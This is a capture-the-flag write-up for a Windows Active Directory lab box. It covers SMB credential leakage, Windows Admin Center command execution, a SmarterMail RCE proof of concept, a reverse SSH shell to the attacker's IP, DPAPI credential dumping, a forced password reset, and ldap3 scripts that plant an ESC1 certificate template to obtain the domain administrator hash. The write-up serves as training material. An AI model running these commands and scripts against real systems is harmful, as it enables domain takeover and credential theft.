# danglingtree.htb

>
>
> **OS:** Windows\
> **Difficulty:** Medium\
> **IP:** `10.10.x.x`\
> **Date:** 03-07-2026

***

### TL;DR

Guest SMB share leaks a PDF with anderson.w's credentials. Windows Admin Center on 6600 gives RCE as that user. Pivot to SmarterMail (17017), exploit CVE-2026-24423 for svc\_mail, decrypt noah.b's 3DES password, DPAPI-loot alex.o, ForceChangePassword on jake.h, then ESC7 for domain escalation.

**Chain:**&#x20;

SMB share > pdf > anderson.w > windows admin center RCE > smartermail RCE > decrypt password > dpapi loot > forcechangepassword > ESC1 vulnerability exploited

***

### Box Info

|                |                                         |
| -------------- | --------------------------------------- |
| **Name**       | danglingtree.htb                        |
| **OS**         | Windows                                 |
| **Difficulty** | Medium                                  |
| **Release**    | Released on 8th August, 2026            |
| **Key skills** | CVE's, decrypting of a DES password, CA |

***

### 1. Recon

#### 1.1 Port scan

```bash
# Nmap 7.99 scan initiated Wed Sep  2 02:24:34 2026 as: /usr/lib/nmap/nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /opt/_NOTES/results/danglingtree/danglingtree.htb/scans/_full_tcp_nmap.txt -oX /opt/_NOTES/results/danglingtree/danglingtree.htb/scans/xml/_full_tcp_nmap.xml danglingtree.htb
Nmap scan report for danglingtree.htb (10.129.78.88)
Host is up, received user-set (0.094s latency).
rDNS record for 10.129.78.88: DC.danglingtree.htb
Scanned at 2026-09-02 02:24:34 CEST for 636s
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE            REASON          VERSION
53/tcp    open  domain             syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http               syn-ack ttl 127 Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec       syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-03 20:33:15Z)
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap               syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?         syn-ack ttl 127
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-26T05:34:19
| Not valid after:  2114-03-26T05:44:18
| MD5:     9054 595f c5e0 bb67 628f f4fc 8d82 a8cf
| SHA-1:   9733 440c 1fd9 f7c9 db9e d4e8 69b7 7b8e 8e71 7781
| SHA-256: fb01 7a29 c4a9 3bee db84 2c1d 77e4 6cd3 d00b 89d8 8229 a712 c4ca db44 3678 29a0
| -----BEGIN CERTIFICATE-----
<...>
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds?      syn-ack ttl 127
464/tcp   open  kpasswd5?          syn-ack ttl 127
593/tcp   open  ncacn_http         syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap           syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
3268/tcp  open  ldap               syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap           syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
6600/tcp  open  ssl/mshvlm?        syn-ack ttl 127
9389/tcp  open  mc-nmf             syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  ncacn_http         syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49713/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49725/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49759/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  2 02:35:10 2026 -- 1 IP address (1 host up) scanned in 636.23 seconds

```

#### 1.2 Initial observations

* Hostname / domain: dc.danglingtree.htb
* Added to `/etc/hosts`:

```
10.129.x.x     DC.danglingtree.htb danglingtree.htb DC 
```

#### 1.3 enumerating shares

After adding the domain controller to `/etc/hosts`  we run an script for enumerating the shares as a guest user. This output returns a .pdf file with credentials associated

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 11.53.17.png" alt=""><figcaption></figcaption></figure>

When opening the .PDF file, we find credentials of the user anderson.w and can continue out pentest to the initial user

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 11.54.46.png" alt=""><figcaption></figcaption></figure>

### 2. Foothold / Initial Access

#### 2.1 Description

> Guest SMB share leaks a PDF with anderson.w's credentials. Windows Admin Center on 6600 gives RCE as that user. Pivot to SmarterMail (17017), exploit CVE-2026-24423 for svc\_mail, decrypt noah.b's 3DES password, DPAPI-loot alex.o, ForceChangePassword on jake.h

#### 2.2 Exploitation

> port 6600

After retrieving the credentials for the AD user anderson.w, I noticed that port 6600 was running a version of Windows Admin Center. I tried logging in to the application, and this worked successfully.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 11.57.17.png" alt=""><figcaption></figcaption></figure>

After that, once you click on the dc gateway property, a powershell command is ran from your browser to the underlying server. The endpoint that is invoked is: `/api/services/WinREST/PowerShell/nodes/dc/invokeCommand`

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.35.43.png" alt=""><figcaption></figcaption></figure>

In this case the endpoint was invoked, but I altered the payload to run a harmless test command instead. As you can see on the right, I am executing a shell command as the user `anderson.w`.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 11.59.11.png" alt=""><figcaption></figcaption></figure>

In the follow-up steps I created a reverse shell utilizing fahrj reverse SSH and connected using SSH.&#x20;

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 12.05.12.png" alt=""><figcaption></figcaption></figure>

I then enumerated the services listening on localhost. Port 17017 in particular looked interesting.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 12.06.28.png" alt=""><figcaption></figcaption></figure>

Port 17017 was then forwarded to my localhost, and after opening at `http://127.0.0.1:17017`  the smartermail application was then found.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 12.08.15.png" alt=""><figcaption></figcaption></figure>

After some research I found a recent CVE for it (CVE-2026-24423) which provides a critical unauthenticated remote code execution (RCE) vulnerability in SmarterTools SmarterMail versions prior to build 9511. \
\
[https://github.com/CyberAlp0/SmarterMail-CVE-2026-24423](https://github.com/CyberAlp0/SmarterMail-CVE-2026-24423)

^ POC

**CVE-2026-24423**

{% file src="../../.gitbook/assets/MalHub.py" %}

^ POC file

LHOST is then set to your VPN IP address, and a port is used to serve the fake "smarterhub" instance. This results in remote code execution, giving access to the user `svc_mail`.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 12.12.46.png" alt=""><figcaption></figcaption></figure>

Once code execution is achieved, it is necessary to collect two files. File 1 is `SmarterMail.Standard.dll`; the second is the `settings.json` of the user account noah.b.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 13.51.10.png" alt=""><figcaption></figcaption></figure>

in the settings.json file of the user `noah.b`, the encrypted password can be found

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 13.52.59.png" alt=""><figcaption></figcaption></figure>

In order to decrypt this (this is a 3DES encryption method) we utilize `dnspy` to read out the iv key that is used to encrypt/decrypt the password.

<figure><img src="../../.gitbook/assets/screenshot_DES.png" alt=""><figcaption></figcaption></figure>

what we do, is retrieve the hexadecimal value of the keys, which can be found underneath

```powershell
PS C:\Users\commando\desktop\HTB_DANGLINGTREE > python3 -c 'print(bytes([180, 63, 132, 209, 16, 180, 233, 145]).hex())'
b43f84d110b4e991
Commando VM 06/27/2026 08:58:41
PS C:\Users\commando\desktop\HTB_DANGLINGTREE > python3 -c 'print(bytes([ 1, 216, 174, 230, 73, 173, 146, 39]).hex())'
01d8aee649ad9227
```

And use CyberChef to create a recipe in order to decrypt the DES encrypted password. First from base64, and lastly from the DES. This results in a valid password as the user `noah.b`.&#x20;

{% embed url="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)DES_Decrypt(%7B'option':'Hex','string':'b43f84d110b4e991'%7D,%7B'option':'Hex','string':'01d8aee649ad9227'%7D,'CBC','Raw','Raw')&input=NjZlN3BwTE9CRjdVZHpEdjd6SzZNSjFybXlVYjFDYnk&oeol=FF" %}

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 13.57.13.png" alt=""><figcaption></figcaption></figure>

> as svc\_mail

```bash
# run as the user svc_mail and get a reverse shell as the user noah.b
.\RunasCs.exe noah.b RiverDragon#Storm25 "cmd /c C:\\users\\public.\\ssh-amd-x64.exe -b 8891 -p 5000 10.10.14.195"
```

Once you get a shell, list your credentials:

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.15.11.png" alt=""><figcaption></figcaption></figure>

And utilize sharpdpapi.exe to retrieve the stored credentials

```bash
C:\Users\Public>sharpdpapi.exe credentials /password:"RiverDragon#Storm25"           

[*] Action: User DPAPI Credential Triage
[*] Will decrypt user masterkeys with password: RiverDragon#Storm25
[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\dae83966-a807-4a29-8173-bb370729254a
[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f

[*] User master key cache:
{dae83966-a807-4a29-8173-bb370729254a}:F7EA2D586E2C84EB9BCE15A2643D1A077A88AF55
{f53fcaba-f057-48e8-8f92-0180d274bf0f}:9979EAB03C0DF45C93ED2D50DB01EC6A6835B818

[*] Triaging Credentials for current user

Folder       : C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\
  CredFile           : 57FFB67D684C67F09E7153B9C7CC3940
    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
    size             : 490
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Enterprise Credential Data
    LastWritten      : 3/27/2026 3:03:38 PM
    TargetName       : Domain:target=PC01.danglingtree.htb
    TargetAlias      :
    Comment          :
    UserName         : alex.o
    Credential       : SunsetMountainPeak@2025 # <-- password of alex.o
```

BloodHound shows that the user alex.o has ForceChangePassword rights over the user jake.h. By abusing this, we can reset the password and gain access to the jake.h account.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.18.24.png" alt=""><figcaption></figcaption></figure>

use bloody-ad to force change the password

```bash
# force change the password of the user jake.h to testTEST12!@
bloodyAD --host '10.129.68.2' -d 'danglingtree.htb' -u 'alex.o' -p 'SunsetMountainPeak@2025' set password 'jake.h' 'testTEST12!@'
```

Once the force change password has happened, we run certipy. It can be seen that there is a ESC7 vulnerability present in the environment.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-10 om 14.31.13.png" alt=""><figcaption></figcaption></figure>

### 3. Privilege Escalation

#### 3.1 Description

> A normal domain user (`jake.h`) holds two delegated AD CS rights: `CREATE_CHILD` for certificate templates and `WRITE` on the template DACL. These are chained to create an ESC1-vulnerable template, grant enrollment, forge an administrator certificate, recover the admin hash, and achieve full domain compromise.

#### 3.2 Exploitation

**Create template**

In order to be allowed to create a new template, the following permissions are required - you can use the following bloodyad command to verify it for yourself:

```bash
# get permissions for the current user
bloodyAD -u jake.h -p 'testTEST12!@' -d danglingtree.htb --host DC.danglingtree.htb get writable --detail
```

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-11 om 11.04.06.png" alt=""><figcaption></figcaption></figure>

```bash
python3 -c 'import struct,ssl;from ldap3 import Server,Connection,ALL,NTLM,Tls;tls=Tls(validate=ssl.CERT_NONE);c=Connection(Server("10.129.68.2",port=636,use_ssl=True,tls=tls,get_info=ALL),user="DANGLINGTREE\jake.h",password="testTEST12!@",authentication=NTLM,auto_bind=True);r=c.add("CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb",attributes={"objectClass":["top","pKICertificateTemplate"],"cn":"EmployeeAuthTemplate","displayName":"EmployeeAuthTemplate","flags":"131680","revision":"100","pKIDefaultKeySpec":"1","pKIKeyUsage":b"\xa0\x00","pKIMaxIssuingDepth":"0","pKICriticalExtensions":["2.5.29.15"],"pKIExtendedKeyUsage":["1.3.6.1.5.5.7.3.2"],"pKIDefaultCSPs":["1,Microsoft RSA SChannel Cryptographic Provider"],"pKIExpirationPeriod":struct.pack("<q",-315360000000000),"pKIOverlapPeriod":struct.pack("<q",-36288000000000),"msPKI-Certificate-Name-Flag":"1","msPKI-Enrollment-Flag":"0","msPKI-Minimal-Key-Size":"2048","msPKI-Private-Key-Flag":"0","msPKI-RA-Signature":"0","msPKI-Template-Minor-Revision":"1","msPKI-Template-Schema-Version":"2","msPKI-Certificate-Application-Policy":["1.3.6.1.5.5.7.3.2"],"msPKI-Cert-Template-OID":"1.3.6.1.4.1.311.21.8.9999999.8888888.7777777.6666666.5555555.1.33.1"});print("[+] Created" if r else "[-] "+str(c.result["description"]))'
```

**Add Enrollment ACE**

Then in the following step, it is needed to add the correct permissions. In order for that to work, you'll need the DACL write permissions on the ceritificate template. You can also check this with bloodyad using the following command:

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-09-11 om 11.10.54.png" alt=""><figcaption></figcaption></figure>

Based on that, we update the newly created EmployeeAuthTemplate with the correct permissions using the underlying script

```bash
python3 -c '
import ssl,struct,uuid
from ldap3 import Server,Connection,ALL,NTLM,Tls,MODIFY_REPLACE,BASE
from ldap3.protocol.microsoft import security_descriptor_control
tls=Tls(validate=ssl.CERT_NONE)
c=Connection(Server("10.129.68.2",port=636,use_ssl=True,tls=tls,get_info=ALL),user="DANGLINGTREE\jake.h",password="testTEST12!@",authentication=NTLM,auto_bind=True)
DN="CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"
ctrl=security_descriptor_control(sdflags=0x4)
c.search(DN,"(objectClass=*)",search_scope=BASE,attributes=["nTSecurityDescriptor"],controls=ctrl)
sd=bytearray(c.entries[0]["nTSecurityDescriptor"].raw_values[0])
au=struct.pack("BB",1,1)+b"\x00\x00\x00\x00\x00\x05"+struct.pack("<I",11)
eg=uuid.UUID("0e10c968-78fb-11d2-90d4-00c04f79dc55").bytes_le
ab=struct.pack("<II",0x100,0x01)+eg+au
ace=struct.pack("BBH",5,0,4+len(ab))+ab
do=struct.unpack_from("<I",sd,16)[0];ds=struct.unpack_from("<H",sd,do+2)[0];ac=struct.unpack_from("<H",sd,do+4)[0];ip=do+ds
sd=sd[:ip]+bytearray(ace)+sd[ip:]
struct.pack_into("<H",sd,do+2,ds+len(ace));struct.pack_into("<H",sd,do+4,ac+1)
c.modify(DN,{"nTSecurityDescriptor":[(MODIFY_REPLACE,[bytes(sd)])]},controls=ctrl)
print("[+] Enrollment ACE added" if c.result["result"]==0 else "[-] "+str(c.result))'
```

Which then introduces a ESC1 vulnerability. Utilizing a set of command, we're able to retrieve the administrator hash and execute code as the user `nt authority\system`.

```bash
┌──(root㉿kali)-[/opt/…/results/danglingtree/loot/jake.h]
└─# certipy req -u 'jake.h@danglingtree.htb' -p 'testTEST12!@' -dc-ip '10.129.68.2' -target "10.129.68.2" -ca 'DANGLINGTREE-DC-CA' -template 'EmployeeAuthTemplate' -upn 'administrator@danglingtree.htb' -sid 'S-1-5-21-4220238332-57023728-1129110646-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@danglingtree.htb'
[*] Certificate object SID is 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/opt/…/results/danglingtree/loot/jake.h]
└─# certipy auth -pfx "administrator.pfx" -dc-ip '10.129.68.2' -username 'administrator' -domain 'danglingtree.htb'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@danglingtree.htb'
[*]     SAN URL SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*]     Security Extension SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Using principal: 'administrator@danglingtree.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
```

print the root.txt

```bash
┌──(root㉿kali)-[/opt/…/results/danglingtree/loot/jake.h]
└─# atexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925' 'administrator'@10.129.68.2 'type C:\Users\Administrator\Desktop\root.txt'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \jNuYiJoE
[*] Running task \jNuYiJoE
[*] Deleting task \jNuYiJoE
[*] Attempting to read ADMIN$\Temp\jNuYiJoE.tmp
4a6bc9982dfd36d37e6daa2634b9c75f
```

